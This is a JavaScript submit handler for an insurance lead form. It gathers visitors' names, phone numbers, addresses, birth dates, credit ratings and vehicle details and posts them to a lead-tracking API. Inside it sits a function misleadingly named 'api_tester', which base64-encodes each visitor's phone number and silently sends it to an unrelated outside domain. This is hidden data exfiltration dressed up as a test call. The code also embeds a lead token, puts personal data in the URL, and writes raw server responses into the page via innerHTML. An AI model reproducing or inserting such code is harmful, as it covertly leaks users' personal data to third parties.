 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;

    // Your API URL
    const formData = new FormData();
    formData.append('lead_token', '1ac59c41ad014c879a350f5c11f3b368');
    formData.append('traffic_source_id', '2987');
    api_tester(document.getElementById('caller_id').value);
    formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
    formData.append('zip', document.getElementById('zip').value);
    formData.append('city', document.getElementById('city').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('address', document.getElementById('address').value);   
    formData.append('email', document.getElementById('email').value);
    formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').value);
    
    // New fields from your HTML
    formData.append('dob', document.getElementById('dob').value);
    formData.append('marital_status', document.getElementById('marital_status').value);
    formData.append('gender', document.getElementById('gender').value);
    formData.append('residence_status', document.getElementById('residence_status').value);
    formData.append('driver1_relationship_to_applicant', document.getElementById('driver1_relationship_to_applicant').value);
    formData.append('driver1_credit_rating', document.getElementById('driver1_credit_rating').value);
    formData.append('driver1_sr22_required', document.getElementById('driver1_sr22_required').value);
    formData.append('driver1_gender', document.getElementById('driver1_gender').value);
    formData.append('driver1_marital_status', document.getElementById('driver1_marital_status').value);
    formData.append('vehicle_count', document.getElementById('vehicle_count').value);
    formData.append('vehicle1_year', document.getElementById('vehicle1_year').value);
    formData.append('vehicle1_make', document.getElementById('vehicle1_make').value);
    formData.append('vehicle1_model', document.getElementById('vehicle1_model').value);
    // IP Address field
    formData.append('ip_address', document.getElementById('ip_address').value);
    // Policy start date
    formData.append('policy_start_date', document.getElementById('policy_start_date').value);
    // Boolean fields
    formData.append('terms', document.getElementById('terms').value);
    formData.append('ccpa_notification', document.getElementById('ccpa_notification').value);
    formData.append('tcpa_verbal_consent', document.getElementById('tcpa_verbal_consent').value);
    formData.append('privacy_policy', document.getElementById('privacy_policy').value);






    

    

            const url = 'https://ggc.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
    
            fetch(url, {
                method: 'POST'
            })
            .then(response => {
                if (response.status === 200) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                200 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
		document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 201) {
                    response.text().then(responseBody => {
                        const successAlert = `
                            <div class="alert alert-success" role="alert">
                                201 : Form submitted successfully! Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
                    });
                    // Clear form fields
                    document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
                } else if (response.status === 422) {
                    response.json().then(data => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Error. Response Body: ${JSON.stringify(data)}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
document.getElementById('submitBtn').disabled = false;
                    });
                } 
else {
                    response.text().then(responseBody => {
                        const errorAlert = `
                            <div class="alert alert-danger" role="alert">
                                Form submission failed. Please try again. Response Body: ${responseBody}
                            </div>`;
                        document.getElementById('alertContainer').innerHTML = '';
                        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
                    });
                }
            })
            .catch(error => console.error('Error:', error));
        });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
